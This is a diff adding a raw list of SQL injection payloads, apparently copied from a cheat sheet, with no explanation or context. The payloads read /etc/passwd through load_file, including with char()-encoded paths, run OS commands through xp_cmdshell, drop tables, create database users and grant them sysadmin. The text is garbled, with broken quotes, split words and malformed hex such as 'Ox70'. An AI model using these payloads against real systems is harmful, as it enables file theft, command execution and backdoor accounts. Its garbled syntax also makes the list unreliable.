@@ -1,0 +1,23 @@
+as var into temp end --
+‘and 1 in (select var from temp)--
+‘union select 1,load _file(’/etc/passwd’),1,1,1;
+1;(load _file(ch
+ar(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;
+‘and 1=( if((load_file(char(110,46,101,120,116))<>ch
+ar(39,39)),1,0)):
+Active SQL Injection (SQI)
+", exec master..xp_cmdshell ‘ping 10.10.1.2'--
+CREATE USER name IDENTIFIED BY ‘pass123'
+CREATE USER name IDENTIFIED BY pass123 TEMPORARY
+TABLESPACE temp DEFAULT TABLESPACE users;
+‘; drop table temp --
+exec sp_addlogin ‘name’ , ‘password’
+exec sp_addsrvrolemember ‘name’ , ‘sysadmin’
+INSERT INTO mysql.user (user, host, password) VALUES
+(‘name; ‘localhost; PASSWORD('pass123’))
+GRANT CONNECT TO name; GRANT RESOURCE TO name;
+INSERT INTO Users(Login, Password, Level) VALUES(
+char(Ox70) + char(Ox65) + char(Ox74) + char(Ox65) + char(Ox72)
++ char(Ox70)
++ char(Ox65) + char(Ox74) + char(Ox65) + char(Ox-
+72),char(Ox64)
